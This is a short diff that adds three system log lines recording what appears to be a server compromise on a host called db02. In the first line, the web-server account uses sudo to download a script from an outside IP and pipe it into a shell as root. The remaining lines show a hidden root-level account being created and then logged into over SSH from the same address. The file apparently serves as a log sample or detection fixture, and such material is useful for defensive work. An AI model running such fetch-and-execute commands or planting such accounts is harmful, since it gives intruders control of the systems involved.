@@ -1,0 +1,3 @@
+Oct  9 16:40:12 db02 sudo:  www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash -c "curl http://185.22.9.4/x.sh | sh"
+Oct  9 16:40:13 db02 useradd[7721]: new user: name=svc_backup, UID=0, GID=0, home=/home/svc_backup
+Oct  9 16:40:15 db02 sshd[7730]: Accepted password for svc_backup from 185.22.9.4 port 39112 ssh2
